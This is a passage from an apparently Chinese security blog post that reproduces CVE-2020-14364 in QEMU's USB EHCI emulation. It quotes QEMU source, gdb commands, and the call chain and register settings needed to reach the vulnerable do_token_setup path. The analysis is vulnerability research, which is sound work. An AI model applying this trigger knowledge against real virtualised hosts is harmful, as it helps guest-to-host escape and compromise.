&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* not supporting dynamic frame list size at the moment */</span></span><br><span class="line">        <span class="keyword">if</span> ((val &amp; USBCMD_FLS) &amp;&amp; !(s-&gt;usbcmd &amp; USBCMD_FLS)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;attempt to set frame list size -- value %d\n&quot;</span>,</span><br><span class="line">                    (<span class="type">int</span>)val &amp; USBCMD_FLS);</span><br><span class="line">            val &amp;= ~USBCMD_FLS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp; USBCMD_IAAD) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Process IAAD immediately, otherwise the Linux IAAD watchdog may</span></span><br><span class="line"><span class="comment">             * trigger and re-use a qh without us seeing the unlink.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            s-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">            trace_usb_ehci_doorbell_ring();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; val) !=</span><br><span class="line">            ((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; s-&gt;usbcmd)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;pstate == EST_INACTIVE) &#123;</span><br><span class="line">                SET_LAST_RUN_CLOCK(s);</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;usbcmd = val; <span class="comment">/* Set usbcmd for ehci_update_halt() */</span></span><br><span class="line">            ehci_update_halt(s);</span><br><span class="line">            s-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> USBSTS:</span><br><span class="line">        val &amp;= USBSTS_RO_MASK;              <span class="comment">// bits 6 through 31 are RO</span></span><br><span class="line">        ehci_clear_usbsts(s, val);          <span class="comment">// bits 0 through 5 are R/WC</span></span><br><span class="line">        val = s-&gt;usbsts;</span><br><span class="line">        ehci_update_irq(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> USBINTR:</span><br><span class="line">        val &amp;= USBINTR_MASK;</span><br><span class="line">        <span class="keyword">if</span> (ehci_enabled(s) &amp;&amp; (USBSTS_FLR &amp; val)) &#123;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FRINDEX:</span><br><span class="line">        val &amp;= <span class="number">0x00003fff</span>; <span class="comment">/* frindex is 14bits */</span></span><br><span class="line">        s-&gt;usbsts_frindex = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CONFIGFLAG:</span><br><span class="line">        val &amp;= <span class="number">0x1</span>;</span><br><span class="line">        <span class="keyword">if</span> (val) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NB_PORTS; i++)</span><br><span class="line">                handle_port_owner_write(s, i, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> PERIODICLISTBASE:</span><br><span class="line">        <span class="keyword">if</span> (ehci_periodic_enabled(s)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">              <span class="string">&quot;ehci: PERIODIC list base register set while periodic schedule\n&quot;</span></span><br><span class="line">              <span class="string">&quot;      is enabled and HC is enabled\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ASYNCLISTADDR:</span><br><span class="line">        <span class="keyword">if</span> (ehci_async_enabled(s)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">              <span class="string">&quot;ehci: ASYNC list address register set while async schedule\n&quot;</span></span><br><span class="line">              <span class="string">&quot;      is enabled and HC is enabled\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *mmio = val;</span><br><span class="line">    trace_usb_ehci_opreg_change(addr + s-&gt;opregbase, addr2str(addr),</span><br><span class="line">                                *mmio, old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>在<code>qemu</code>启动的时候对<code>do_token_setup</code>下断点，<code>gdb_dbg</code>如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file qemu-system-x86_64 0x555555554000</span><br><span class="line"><span class="built_in">set</span> args -m 1G -nographic -hda ./rootfs.img -kernel ./bzImage -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> -device e1000,netdev=net0 -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::2222-:22 -usb -drive <span class="keyword">if</span>=none,forma1</span><br><span class="line">b do_token_setup</span><br></pre></td></tr></table></figure><p>我们可以看到如下的函数调用链</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2020-14364-QEMU-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210312213834240.png" alt="图片无法显示，请联系作者" title=" "><p>也就是如下的函数调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">do_token_setup</span><br><span class="line">usb_process_one</span><br><span class="line">usb_handle_packet</span><br><span class="line">ehci_execute</span><br><span class="line">ehci_state_execute</span><br><span class="line">ehci_advance_state</span><br><span class="line">ehci_advance_async_state</span><br><span class="line">ehci_work_bh</span><br></pre></td></tr></table></figure><p>但是这里存在一个问题就是当我们对<code>ehci_advance_async_state</code>函数下了断点之后，其会多次断在这个函数上，因此我们选择另一个函数调用链，对<code>ehci_advance_state</code>函数进行交叉引用，我们发现<code>ehci_advance_periodic_state</code>函数也会调用<code>ehci_advance_state</code>函数，因此选择的函数调用链如下</p><p><code>ehci_work_bh-&gt;ehci_advance_periodic_state-&gt;ehci_advance_state-&gt;ehci_state_execute-&gt;ehci_execute-&gt;usb_handle_packet-&gt;usb_process_one-&gt;do_token_setup</code></p><p>我们接下来依次分析一下函数触发的条件首先是<code>ehci_work_bh</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_work_bh</span><span class="params">(<span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">  EHCIState *ehci = opaque;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ehci-&gt;working) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ehci-&gt;working = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  t_now = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">  ns_elapsed = t_now - ehci-&gt;last_run_ns;</span><br><span class="line">  uframes = ns_elapsed / UFRAME_TIMER_NS;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE) &#123;</span><br><span class="line">    need_timer++;</span><br><span class="line">    <span class="keyword">if</span> (uframes &gt; (ehci-&gt;maxframes * <span class="number">8</span>)) &#123;</span><br><span class="line">      skipped_uframes = uframes - (ehci-&gt;maxframes * <span class="number">8</span>);</span><br><span class="line">      ehci_update_frindex(ehci, skipped_uframes);</span><br><span class="line">      ehci-&gt;last_run_ns += UFRAME_TIMER_NS * skipped_uframes;</span><br><span class="line">      uframes -= skipped_uframes;</span><br><span class="line">      DPRINTF(<span class="string">&quot;WARNING - EHCI skipped %d uframes\n&quot;</span>, skipped_uframes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; uframes; i++) &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      ehci_update_frindex(ehci, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ((ehci-&gt;frindex &amp; <span class="number">7</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        ehci_advance_periodic_state(ehci); <span class="comment">// 目标函数</span></span><br><span class="line">      &#125;</span><br><span class="line">      ehci-&gt;last_run_ns += UFRAME_TIMER_NS;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> ehci_update_frindex(EHCIState *ehci, <span class="type">int</span> uframes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  ehci-&gt;frindex = (ehci-&gt;frindex + uframes) % <span class="number">0x4000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USBCMD_PSE       (1 &lt;&lt; 4)      <span class="comment">// Periodic Schedule Enable</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">ehci_periodic_enabled</span><span class="params">(EHCIState *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ehci_enabled(s) &amp;&amp; (s-&gt;usbcmd &amp; USBCMD_PSE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USBCMD_RUNSTOP   (1 &lt;&lt; 0)      <span class="comment">// run / Stop</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">ehci_enabled</span><span class="params">(EHCIState *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;usbcmd &amp; USBCMD_RUNSTOP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中我们可以看到，首先需要满足条件判断<code>ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE</code>，这里我们选择满足前者，也就是<code>ehci_periodic_enabled(ehci)</code>，那么就需要<code>s-&gt;usbcmd &amp; USBCMD_RUNSTOP==1 &amp;&amp; s-&gt;usbcmd &amp; USBCMD_PSE==1</code>这两个条件。</p><blockquote><p>这里对<code>usbcmd</code>的设置可以通过<code>mmio_write(0x20, value)</code>进行设置，因为<code>usbcmd</code>是<code>opreg</code>结构体中的成员变量，而0x20用来设置该结构体中的值，<code>usbcmd</code>是第一个成员变量，因此这里直接<code>mmio_write(0x20, value)</code>即可以设置<code>usbcmd</code>。</p></blockquote><p>接着需要满足<code>(ehci-&gt;frindex &amp; 7) == 0</code>判断条件，在这个判断条件之前，函数会调用<code>ehci_update_frindex(ehci, 1);</code>，该函数会导致<code>frindex</code>每次<code>+1</code>，也就是总会满足这个判断条件。</p><p>接着进入<code>ehci_advance_periodic_state</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_advance_periodic_state</span><span class="params">(EHCIState *ehci)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> async = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span>(ehci_get_state(ehci, async)) &#123;</span><br><span class="line">    <span class="keyword">case</span> EST_INACTIVE:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> EST_ACTIVE:</span><br><span class="line">        <span class="keyword">if</span> (!(ehci-&gt;frindex &amp; <span class="number">7</span>) &amp;&amp; !ehci_periodic_enabled(ehci)) &#123;<span class="comment">// 进入函数的先决条件，肯定满足</span></span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">list</span> = ehci-&gt;periodiclistbase &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">        <span class="comment">/* check that register has been set */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">list</span> |= ((ehci-&gt;frindex &amp; <span class="number">0x1ff8</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (get_dwords(ehci, <span class="built_in">list</span>, &amp;entry, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">&quot;PERIODIC state adv fr=%d.  [%08X] -&gt; %08X\n&quot;</span>,</span><br><span class="line">                ehci-&gt;frindex / <span class="number">8</span>, <span class="built_in">list</span>, entry);</span><br><span class="line">        ehci_set_fetch_addr(ehci, async,entry);</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHENTRY);</span><br><span class="line">        ehci_advance_state(ehci, async);  <span class="comment">// 目标函数</span></span><br><span class="line">        ehci_queues_rip_unused(ehci, async);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_get_state</span><span class="params">(EHCIState *s, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> async ? s-&gt;astate : s-&gt;pstate;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_dwords</span><span class="params">(EHCIState *ehci, <span class="type">uint32_t</span> addr,</span></span><br><span class="line"><span class="params">                             <span class="type">uint32_t</span> *buf, <span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ehci-&gt;as) &#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++, buf++, addr += <span class="keyword">sizeof</span>(*buf)) &#123;</span><br><span class="line">        dma_memory_read(ehci-&gt;as, addr, buf, <span class="keyword">sizeof</span>(*buf));</span><br><span class="line">        *buf = le32_to_cpu(*buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_set_fetch_addr</span><span class="params">(EHCIState *s, <span class="type">int</span> async, <span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (async) &#123;</span><br><span class="line">        s-&gt;a_fetch_addr = addr;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s-&gt;p_fetch_addr = addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中我们看到，首先需要满足<code>ehci-&gt;pstate==EST_ACTIVE</code>，才能够进入<code>case</code>，接着进行了一个<code>if</code>判断，但是这个判断的条件正好是我们由<code>ehci_work_bh</code>进入<code>ehci_advance_periodic_state</code>函数的先觉条件，因此这里总是可以满足，也就不会绕过<code>break</code>。</p><p>接着将<code>ehci-&gt;periodiclistbase</code>对齐后的地址赋值给了<code>list</code>，然后执行了<code>list |= ((ehci-&gt;frindex &amp; 0x1ff8) &gt;&gt; 1);</code>从调试来看这里等价于<code>list+4</code>，这里只要满足<code>list!=0</code>即可。接下来是<code>get_words</code>的条件判断，这里需要满足<code>ehci-&gt;as != 0</code>。接着是调用了两个<code>set</code>函数，比较重要的就是<code>ehci_set_fetch_addr</code>函数，首先是<code>get_words</code>从<code>list</code>中读取内容赋值给<code>entry</code>，接着<code>ehci_set_fetch_addr</code>函数将<code>entry</code>赋值给<code>echi-&gt;p_fetch_addr</code>。</p><p>接着看一下<code>ehci_advance_state</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is the state machine that is common to both async and periodic</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_advance_state</span><span class="params">(EHCIState *ehci, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIQueue *q = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> itd_count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> again;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span>(ehci_get_state(ehci, async)) &#123;</span><br><span class="line">        <span class="keyword">case</span> EST_WAITLISTHEAD:</span><br><span class="line">            again = ehci_state_waitlisthead(ehci, async);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHENTRY:</span><br><span class="line">            again = ehci_state_fetchentry(ehci, async);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHQH:</span><br><span class="line">            q = ehci_state_fetchqh(ehci, async);</span><br><span class="line">            <span class="keyword">if</span> (q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                assert(q-&gt;async == async);</span><br><span class="line">                again = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                again = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHITD:</span><br><span class="line">            again = ehci_state_fetchitd(ehci, async);</span><br><span class="line">            itd_count++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHSITD:</span><br><span class="line">            again = ehci_state_fetchsitd(ehci, async);</span><br><span class="line">            itd_count++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_ADVANCEQUEUE:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_advqueue(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHQTD:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_fetchqtd(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_HORIZONTALQH:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_horizqh(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_EXECUTE:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_execute(q); <span class="comment">// 目标函数</span></span><br><span class="line">            <span class="keyword">if</span> (async) &#123;</span><br><span class="line">                ehci-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_EXECUTING:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (async) &#123;</span><br><span class="line">                ehci-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            again = ehci_state_executing(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_WRITEBACK:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_writeback(q);</span><br><span class="line">            <span class="keyword">if</span> (!async) &#123;</span><br><span class="line">                ehci-&gt;periodic_sched_active = PERIODIC_ACTIVE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Bad state!\n&quot;</span>);</span><br><span class="line">            again = <span class="number">-1</span>;</span><br><span class="line">            g_assert_not_reached();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (again);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_get_state</span><span class="params">(EHCIState *s, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> async ? s-&gt;astate : s-&gt;pstate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释该函数是一个状态机，根据<code>echi-&gt;pstate</code>的值来决定进入哪个状态。经过调试函数会首先进入<code>EST_FETCHENTRY</code>状态调用<code>ehci_state_fetchentry</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_state_fetchentry</span><span class="params">(EHCIState *ehci, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> again = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (NLPTR_TYPE_GET(entry)) &#123;</span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_QH:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHQH);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_ITD:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHITD);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_STITD:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHSITD);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> again;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NLPTR_TYPE_GET(x)        (((x) &gt;&gt; 1) &amp; 